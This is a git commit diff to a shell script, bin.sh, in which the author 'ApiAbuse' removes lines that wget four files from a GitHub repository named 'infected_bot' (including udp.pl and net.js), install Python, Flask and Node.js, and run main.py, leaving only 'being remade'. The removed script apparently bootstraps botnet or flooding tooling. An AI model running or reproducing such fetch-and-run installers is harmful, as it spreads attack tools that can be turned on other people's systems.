f67772d3a9a9d2d156fd0785be34594a1a8740eb
ApiAbuse <68893555+ixzy@users.noreply.github.com>
2022-12-22 15:56:08 -0500

    Update bin.sh

--- bin.sh
+++ bin.sh
@@ -1,10 +1,1 @@
-wget https://raw.githubusercontent.com/ixzy/infected_bot/main/main.py
-wget https://raw.githubusercontent.com/ixzy/infected_bot/main/net.js
-wget https://raw.githubusercontent.com/ixzy/infected_bot/main/udp.pl
-wget https://raw.githubusercontent.com/ixzy/infected_bot/main/checker.py
-sudo apt install python3 -y
-sudo apt install python3-pip -y
-python3 -m pip install flask
-python3 -m pip install flask
-sudo apt install nodejs
-python3 main.py
+being remade
